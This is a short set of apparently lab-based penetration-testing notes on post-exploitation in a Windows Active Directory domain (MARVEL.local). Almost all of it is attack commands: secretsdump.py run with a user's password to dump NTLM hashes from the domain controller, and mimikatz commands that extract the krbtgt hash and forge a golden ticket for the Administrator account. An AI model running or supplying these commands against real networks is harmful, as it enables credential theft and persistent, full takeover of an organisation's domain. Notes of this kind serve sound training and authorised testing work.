# Post compromising domain

## Dumping thz ntds.dit

```
secretsdump.py MARVEL.local/pparker:'Password2'@192.168.138.132 -just-dc-ntlm 
```

## Golden ticket attack



```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
# Reuse creds to create golden ticket
kerberos::golden /User:Administrator /domain:marvel.local /sid:[SID_VALUE] /krbtgt:[KRBTGT_NTLM_HASH] /id:[RELATIVE_ID] /ptt
```

